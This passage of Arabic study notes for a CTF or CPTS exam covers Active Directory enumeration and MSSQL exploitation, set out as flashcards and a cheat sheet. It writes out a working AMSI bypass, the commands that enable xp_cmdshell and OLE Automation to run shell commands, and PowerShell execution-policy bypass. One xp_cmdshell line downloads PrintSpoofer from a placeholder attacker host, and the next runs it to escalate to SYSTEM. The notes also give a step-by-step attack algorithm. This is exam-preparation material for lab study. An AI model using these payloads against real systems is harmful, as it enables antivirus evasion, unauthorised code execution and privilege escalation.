❓ Front: حساب الـ SQL Service لا يملك صلاحية قراءة ملف اليوزر. كيف تصعد الصلاحية لـ SYSTEM؟

✅ Back: نستخدم صلاحية `SeImpersonatePrivilege` بتشغيل أدوات مثل `PrintSpoofer.exe` أو `JuicyPotato` عبر الـ xp_cmdshell.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 Card #6

❓ Front: كيف تتجاوز حظر الـ AMSI للباورشيل قبل استيراد أدوات الاختراق؟

✅ Back: نستخدم سطر الـ AMSI Bypass الذي يغير قيمة `amsiInitFailed` في الذاكرة إلى True ($true).

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 Card #7

❓ Front: البديل الذهبي لـ xp_cmdshell إذا كانت محظورة نهائياً؟

✅ Back: استخدام ميزة OLE Automation عبر الدوال `sp_OACreate` و `sp_OAMethod` لفتح الـ shell.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

━━━━━

📄 ورقة الغش (Cheat Sheet) — للسكرين شوت

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📄 المخلص النهائي (Manual AD Enum & SQL Exploitation Cheat Sheet)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

⚔️ خوارزمية الهجوم:

١. واجهت قيود على الأدوات؟ الجأ للأدوات اليدوية والمدمجة (LotL).

٢. نفذ AMSI Bypass إن لزم الأمر.

٣. استخدم PowerView لاكتشاف جروبات WinRM على الحواسيب المستهدفة.

٤. تأكد من إمكانية الدخول بـ Enter-PSSession.

٥. اتصل بـ SQL Server ببيانات الدخول الصالحة.

٦. فعّل xp_cmdshell، وإن فشل استخدم T-SQL اليدوي أو OLE.

٧. استخرج الـ Flag، وإذا واجهت Access Denied، استخدم PrintSpoofer للـ SYSTEM.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📐 جدول الأوامر الأساسية:

|**المجال**|**الهدف**|**الأمر**|
|---|---|---|
|AV Evasion|AMSI Bypass بالذاكرة|`[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)`|
|AD Enum|استيراد PowerView|`Import-Module C:\Tools\PowerView.ps1`|
|AD Enum|فحص WinRM عن بعد|`Get-NetLocalGroupMember -ComputerName TARGET -GroupName "Remote Management Users"`|
|AD Enum|استكشاف الـ ACLs|`Get-DomainComputer \| Get-DomainObjectAcl -ResolveGUIDs \| Where-Object {$_.ActiveDirectoryRights -match "GenericAll"}`|
|Native Enum|استخدام AD Module (آمن)|`Import-Module ActiveDirectory ; Get-ADGroupMember -Identity "Remote Management Users" -Recursive`|
|WinRM|إعداد باسوورد مشفر|`$password = ConvertTo-SecureString "Pass123!" -AsPlainText -Force`|
|WinRM|الاتصال الفعلي|`Enter-PSSession -ComputerName TARGET -Credential (New-Object System.Management.Automation.PSCredential("DOMAIN\User", $password))`|
|SQL Attack|الاتصال بحساب دومين|`mssqlclient.py DOMAIN/USER:PASS@TARGET_IP -windows-auth`|
|SQL Attack|أوامر mssqlclient السريعة|`enable_xp_cmdshell` ثم `xp_cmdshell 'whoami'`|
|SQL Attack|تفعيل T-SQL يدوياً|`EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;`|
|SQL Attack|تفعيل OLE Automation|`EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE; DECLARE @sh INT; EXEC sp_OACreate 'wscript.shell', @sh OUTPUT; EXEC sp_OAMethod @sh, 'run', null, 'cmd /c whoami > C:\out.txt';`|
|SQL PrivEsc|تحميل PrintSpoofer|`xp_cmdshell "powershell -c (New-Object Net.WebClient).DownloadFile('http://ATT/ps.exe','C:\Temp\ps.exe')"`|
|SQL PrivEsc|التنفيذ كـ SYSTEM|`xp_cmdshell "C:\Temp\ps.exe -i -c 'type C:\Users\Admin\flag.txt'"`|

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🚨 الفخوخ (لا تنساها):

❌ تشغيل باورشيل بدون تخطي السياسات (حله: `powershell -ep bypass`).

❌ محاولة الاتصال بـ SQL بيوزر ويندوز دون تمرير `-windows-auth`.

❌ الاعتقاد بأن حساب `NT SERVICE\MSSQL` يملك صلاحيات حساب الـ Windows للمدير (damundsen). الصلاحيات تختلف!

❌ التوقف عند حظر `xp_cmdshell` وعدم المحاولة مع `sp_OACreate`.

❌ كتابة الأوامر داخل الـ SQL بدون Single Quotes `''`.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

بهيج خلصنا. هسة عندك:

✅ القصة الكبيرة (ليش هالهجوم/التقنية موجودة)

✅ كل المصطلحات (SQLi, XSS, SUID, Kerberoasting, PTH, stego...)

✅ كيفية التفكير (decision trees لكل نوع هجوم)

✅ الاستغلال التفصيلي (خطوة خطوة مع الأوامر)

✅ الـ bypasses والـ variations والفخوخ

✅ فلاشكاردز (للمراجعة السريعة)

✅ ورقة الغش (سكرين شوت قبل الـ CTF أو الامتحان)

راجع الفلاشكاردز وورقة الغش قبل كل تحدي — وراح تجد الأنماط مألوفة. بالتوفيق! 💪
---

```
╔══════════════════════════════════════════════════════════════════════╗
║                                                                      ║
║  [✓] SESSION COMPLETE — ZERO KNOWLEDGE GAPS DETECTED                 ║
║  [✓] 3 PHASES · ~6,000 WORDS · 6 ATTACK METHODS DOCUMENTED          ║
║  [✓] AUTHORED BY: Hexsein · CPTS Candidate · Al-Nahrain Univ.       ║
║  [→] NEXT TARGET: SEC-22 — NEXT SECTION NAME HERE                   ║
║                                                                      ║
╚══════════════════════════════════════════════════════════════════════╝
```